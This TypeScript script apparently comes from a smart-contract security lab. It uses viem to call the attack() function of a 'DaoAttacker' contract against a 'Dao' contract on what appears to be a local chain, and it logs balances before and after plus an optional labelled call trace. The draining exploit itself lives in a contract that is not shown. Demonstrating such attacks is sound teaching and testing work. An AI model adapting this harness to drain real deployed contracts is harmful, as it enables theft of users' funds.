import { wallet, debugClient, visit } from './lib/index.ts'
import {
    decodeFunctionData,
    encodeFunctionData,
    formatEther,
    hexToBigInt,
    parseEventLogs,
} from 'viem'
import { Dao, DaoAttacker } from '../codegen/addresses.ts'
import { abis } from '../codegen/abis.ts'

const visitor: Parameters<typeof visit>[1] = (key, value) => {
    switch (key) {
        case 'gas':
        case 'output':
        case 'gasUsed':
            return null
        case 'address':
        case 'from':
        case 'to': {
            if (value === Dao) {
                return '<DAO>'
            } else if (value === DaoAttacker) {
                return '<Attacker>'
            } else if (value == wallet.account.address.toLowerCase()) {
                return '<caller>'
            }

            return value
        }
        case 'value':
            return formatEther(hexToBigInt(value))
        case 'input':
            try {
                return decodeFunctionData({
                    abi: abis.DaoAttacker,
                    data: value,
                })
            } catch (e) {
                try {
                    return decodeFunctionData({
                        abi: abis.Dao,
                        data: value,
                    })
                } catch (e) {
                    return value
                }
            }
        case 'logs':
            return parseEventLogs({ abi: abis.DaoAttacker, logs: value })
        default: {
            if (typeof value === 'bigint') {
                return value.toString()
            }
            return value
        }
    }
}

if (process.env.DEBUG) {
    const result = await debugClient.traceCall(
        {
            to: DaoAttacker,
            from: wallet.account.address,
            data: encodeFunctionData({
                abi: abis.DaoAttacker,
                functionName: 'attack',
                args: [],
            }),
        },
        { withLog: false }
    )
    console.log(JSON.stringify(visit(result, visitor), null, 2))
    process.exit(0)
}

console.log(
    `Attacker balance: ${formatEther(await wallet.getBalance({ address: DaoAttacker }))}`
)
console.log(
    `DAO balance: ${formatEther(await wallet.getBalance({ address: Dao }))}`
)

const deposit = await wallet.readContract({
    address: Dao,
    abi: abis.Dao,
    functionName: 'getBalance',
    args: [DaoAttacker],
})

console.log(`Attacker deposit: ${formatEther(deposit)}`)
const { request } = await wallet.simulateContract({
    address: DaoAttacker,
    abi: abis.DaoAttacker,
    functionName: 'attack',
})

const hash = await wallet.writeContract(request)
let receipt = await wallet.waitForTransactionReceipt({
    hash,
})

console.assert(receipt.status === 'success', 'Transaction failed')

console.log(
    `Attacker balance: ${formatEther(await wallet.getBalance({ address: DaoAttacker }))}`
)
console.log(
    `DAO balance: ${formatEther(await wallet.getBalance({ address: Dao }))}`
)
